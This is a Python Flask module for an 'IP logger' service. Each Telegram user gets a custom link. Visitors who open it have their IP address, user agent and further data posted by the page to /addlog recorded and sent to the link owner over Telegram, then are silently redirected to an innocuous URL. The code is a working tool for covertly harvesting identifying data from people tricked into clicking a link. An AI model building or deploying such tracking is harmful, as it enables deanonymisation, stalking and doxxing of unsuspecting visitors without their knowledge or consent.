import time
import json
from flask import Blueprint, request, render_template, redirect, jsonify

from app.logger.utilities import LoggerLog
from app.database.users.crud import get_user_by_address
from app.database.logs.crud import update_log, get_logs_by_ip
from app.database.models import Log
from app.utils.logging_config import get_logger, get_error_logger

# Initialize loggers
logger = get_logger("ip_logger", log_file="ip_logger.log")
error_logger = get_error_logger()

bp = Blueprint(
    "ip_logger",
    __name__,
    template_folder="../../templates"
)

ips: dict[str, LoggerLog] = dict()
logger.info("IP Logger blueprint initialized")


@bp.route("/<regex('^[^_]\\w+[^_]$'):path>")
def ip_logger(path: str):
    try:
        # Get the real IP address
        if request.environ.get("HTTP_X_FORWARDED_FOR"):
            ip = request.environ["HTTP_X_FORWARDED_FOR"].split(",")[-1].strip()
        else:
            ip = request.environ.get("HTTP_X_REAL_IP", request.remote_addr)

        logger.info(f"Logger accessed with path '{path}' from IP {ip}")
        logger.debug(f"X-Forwarded-For: {request.environ.get('HTTP_X_FORWARDED_FOR')}")

        # Check if the path exists
        tg_user = get_user_by_address(path)
        if tg_user is None:
            logger.warning(f"Invalid path '{path}' accessed from IP {ip}")
            return "Not found", 404

        logger.info(f"Valid path '{path}' for user {tg_user.id} accessed from IP {ip}")

        # Check if this is a new IP or a returning visitor
        if ips.get(ip) is None:
            logger.info(f"New visitor from IP {ip} for user {tg_user.id}")
            ips[ip] = LoggerLog(ip_address=ip, receiver_tg_id=tg_user.id, user_agent=request.user_agent.string)
        elif time.time() - ips[ip].last_response <= 60:
            logger.info(f"Returning visitor from IP {ip} within 60 seconds, redirecting")
            return redirect(tg_user.redirect_url)
        else:
            logger.info(f"Returning visitor from IP {ip} after timeout")
            ips[ip].last_response = time.time()
            ips[ip].receiver_tg_id = tg_user.id

        ips[ip].last_response = time.time()
        
        # Send the log message
        try:
            ips[ip].send_message(ips[ip].get_main_log())
            logger.info(f"Main log sent to Telegram for user {tg_user.id}")
        except Exception as e:
            error_logger.error(f"Failed to send main log to Telegram: {str(e)}", exc_info=True)

        logger.info(f"Rendering template for IP {ip} with redirect to {tg_user.redirect_url}")
        return render_template("index.html", redirect_url=tg_user.redirect_url)
    
    except Exception as e:
        error_logger.error(f"Error in logger route: {str(e)}", exc_info=True)
        return "An error occurred", 500


@bp.route("/addlog", methods=['POST'])
def add_log():
    try:
        # Get the real IP address
        if request.environ.get("HTTP_X_FORWARDED_FOR"):
            ip = request.environ["HTTP_X_FORWARDED_FOR"].split(",")[-1].strip()
        else:
            ip = request.environ.get("HTTP_X_REAL_IP", request.remote_addr)
        
        logger.info(f"Additional log data received from IP {ip}")
        logger.debug(f"X-Forwarded-For: {request.environ.get('HTTP_X_FORWARDED_FOR')}")

        # Check if this is a valid request
        if ip not in ips:
            logger.warning(f"Attempt to add log from unknown IP {ip}")
            return jsonify({"error": "Unauthorized"}), 403
            
        if time.time() - ips[ip].last_response >= 10:
            logger.warning(f"Attempt to add log from IP {ip} after timeout")
            return jsonify({"error": "Request timeout"}), 403

        # Process the new data
        new_data = request.get_json()
        logger.debug(f"Received data from IP {ip}: {new_data}")
        ips[ip].data.update(new_data)
        
        # Update the log in the database
        recent_logs = get_logs_by_ip(ip)
        if recent_logs:
            update_log(recent_logs[0].id, new_data)
            logger.info(f"Updated log {recent_logs[0].id} with new data from IP {ip}")
        
        # Edit the existing message instead of sending a new one
        try:
            # Create a combined log with both main and additional info
            combined_log = ips[ip].get_combined_log()
            ips[ip].edit_message(combined_log)
            logger.info(f"Log message updated for user {ips[ip].receiver_tg_id}")
        except Exception as e:
            error_logger.error(f"Failed to update log message: {str(e)}", exc_info=True)
            
        return jsonify({"status": "success"}), 201
    
    except Exception as e:
        error_logger.error(f"Error in add_log route: {str(e)}", exc_info=True)
        return jsonify({"error": "An error occurred"}), 500
